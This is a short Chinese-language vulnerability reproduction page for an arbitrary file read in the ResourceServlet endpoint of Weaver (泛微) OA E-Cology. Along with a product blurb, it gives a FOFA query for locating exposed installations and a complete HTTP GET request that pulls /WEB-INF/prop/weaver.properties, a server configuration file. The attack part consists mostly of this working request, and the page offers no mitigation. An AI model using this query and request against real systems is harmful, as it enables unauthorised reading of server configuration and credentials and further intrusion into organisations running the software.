## .泛微OA E-Cology简介

泛微e-cology依托全新的设计理念,全新的管理思想为中大型组织创建全新的高效协同办公环境。

## 漏洞描述

泛微e-cology依托全新的设计理念,全新的管理思想。 为中大型组织创建全新的高效协同办公环境。 智能语音办公,简化软件操作界面。 身份认证、电子签名、电子签章、数据存证让合同全程数字化。泛微OA E-Cology ResourceServlet接口存在任意文件读取漏洞

## 影响版本

泛微e-cology

## fofa查询语句

app="泛微-OA（e-cology）"

## 漏洞复现

漏洞链接：http://xxx.xxx.xxx.xxx/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties

漏洞数据包：

```yaml
GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties HTTP/1.1
Host: xx.xxx.xxx.xxx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

